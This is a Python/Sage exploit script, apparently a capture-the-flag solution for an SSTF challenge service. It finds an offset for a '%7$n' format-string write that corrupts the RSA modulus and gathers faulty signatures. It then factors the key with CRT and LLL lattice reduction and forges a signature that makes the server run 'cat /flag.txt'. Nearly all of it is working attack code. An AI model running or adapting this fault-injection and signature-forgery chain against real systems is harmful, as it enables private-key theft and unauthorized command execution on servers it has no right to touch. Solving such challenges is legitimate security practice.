from pwn import *
from time import sleep
from Crypto.Util.number import bytes_to_long

server, port = "peerreview.sstf.site", 35354
server, port = "eca189e9.sstf.site", 1337

#context.log_level='debug'

def injectFault(offset):
	r = remote(server, port)
	#r = process("./saferunner2")

	r.sendlineafter(b" > ", b"2")
	sleep(0.1)
	n = int(r.readline().split(b" = ")[1])	#get n
	e = int(r.readline().split(b" = ")[1])	#get e

	r.sendlineafter(b" > ", b"9999")
	r.sendline(str(offset).encode())
	r.sendline(b"%7$n")

	return r, n, e

def try_offset(offset):
	print("offset:", offset)
	try:
		r, ori_n, _ = injectFault(offset)

		r.sendlineafter(b" > ", b"0")
		pq = int(r.recvuntil(b" 4)").split(b'\n')[3].split(b'it\'s')[2].strip())

		r.sendlineafter(b" > ", b"2")
		new_n = int(r.readline().split(b" = ")[1])	#get n

		r.close()

		return ori_n == pq and ori_n != new_n	#True iff only n is modified.
	except Exception as e:
		return False

def find_offset():
	step = 1024 // 8 - 1	# 1 byte less than size of p

	offset = step
	while True:
		if try_offset(offset):
			return offset

		if try_offset(-offset):
			return -offset

		offset += step

#find an offset between allocated buffer and n.
offset = find_offset()
#offset = -2540

print("Offset", offset, "changed n!")

r = remote(server, port)
#r = process("./saferunner2")

r.sendlineafter(b" > ", b"2")
n1 = int(r.readline().split(b" = ")[1])	#get original n
e = int(r.readline().split(b" = ")[1])	#get e

## get valid signatures
s1 = []
for i in range(6):
	r.sendlineafter(b" > ", b"1")
	r.sendlineafter(b" > ", str(i).encode())
	r.sendlineafter(b" > ", b"3")
	s1.append(int(r.readline().split(b" = ")[1]))

## modify n
r.sendlineafter(b" > ", b"9999")
r.sendline(str(offset).encode())
r.sendline(b"%7$n")

r.sendlineafter(b" > ", b"2")
n2 = int(r.readline().split(b" = ")[1])	#get n'

## get corrupted signatures
s2 = []
for i in range(6):
	r.sendlineafter(b" > ", b"1")
	r.sendlineafter(b" > ", str(i).encode())
	r.sendlineafter(b" > ", b"3")
	s2.append(int(r.readline().split(b" = ")[1]))

sock = r

## get CRT(sp, sq) using crt
v = []
for x, y in zip(s1, s2):
	v.append(crt(x, y, n1, n2))

#print("CRT results =", v)

l = 1024
r = 6

##?? how to choose k1: the size of k1
k1 = 2**32
d1 = r+1
base1 = list()

for i in range(0, r):
	vector = list()
	for j in range(0, d1):
		if j == 0:
			vector.append(k1*v[i])
		else:
			if j == i+1:
				vector.append(1)
			else:
				vector.append(0)
	base1.append(vector)
	
base1 = Matrix(ZZ, r, d1, base1)
base1.transpose()
reduced1 = base1.LLL()


#?? how to choose k2: the size of k2
#!! roughly l
k2 = 2**l
d2 = r-2+r
base2 = list()
for i in range(0, r):
	vector = list()
	for j in range(0, d2):
		if j < r-2:
			vector.append(k2*reduced1[j][i+1])
		else:
			if j == i+r-2:
				vector.append(1)
			else:
				vector.append(0)
	base2.append(vector)
	
base2 = Matrix(ZZ, r, d2, base2)
base2.transpose()
reduced2 = base2.LLL()

w1 = list()
w2 = list()
for i in range(0, r):
	w1.append(reduced2[0][r-2+i])
	w2.append(reduced2[1][r-2+i])

sol = [
	gcd(v[0]+w1[0], n1), 
	gcd(v[0]+w2[0], n1), 
	gcd(v[0]-w1[0], n1), 
	gcd(v[0]-w2[0], n1),
	gcd(v[0]+(w1[0]+w2[0]), n1), 
	gcd(v[0]+(w1[0]-w2[0]), n1), 
	gcd(v[0]+(-w1[0]+w2[0]), n1), 
	gcd(v[0]+(-w1[0]-w2[0]), n1), 
]
for s in sol:
	if s != 1 and s != n1 and n1%s == 0:
		print("Factoring success!!")
		break
else:
	print("Factoring is failed.")
	exit()

r = sock

p = s
q = n1 // s

m = bytes_to_long(b"ls -la /")			#message
d = pow(e, -1, (p - 1) * (q - 1))		#get d
cmd = b"cat /flag.txt"					#command to be executed
sign = pow(bytes_to_long(cmd), int(d), int(n1))	#make signature

r.sendlineafter(b" > ", b"4")			#execute the command with the signature
r.sendlineafter(b" > ", cmd)
r.sendlineafter(b" > ", str(sign).encode())

print("Flag:", r.readline().decode())

r.close()
